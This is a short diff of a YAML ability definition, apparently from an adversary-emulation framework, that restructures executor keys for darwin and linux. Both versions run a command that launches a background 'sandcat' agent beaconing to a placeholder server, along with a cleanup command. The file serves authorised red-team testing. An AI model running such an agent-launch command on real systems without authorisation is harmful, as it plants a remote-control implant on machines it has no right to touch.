@@ -7,16 +7,18 @@
   technique:
     attack_id: T1059
     name: Command-Line Interface
-  executors:
+  platforms:
     darwin:
-      command: |
-        nohup ./sandcat.go -server #{server} &
-      cleanup: |
-        pkill -f sandcat
-      payload: sandcat.go
+      sh:
+        command: |
+          nohup ./sandcat.go -server #{server} &
+        cleanup: |
+          pkill -f sandcat
+        payload: sandcat.go
     linux:
-      command: |
-        nohup ./sandcat.go -server #{server} &
-      cleanup: |
-        pkill -f sandcat
-      payload: sandcat.go
+      sh:
+        command: |
+          nohup ./sandcat.go -server #{server} &
+        cleanup: |
+          pkill -f sandcat
+        payload: sandcat.go
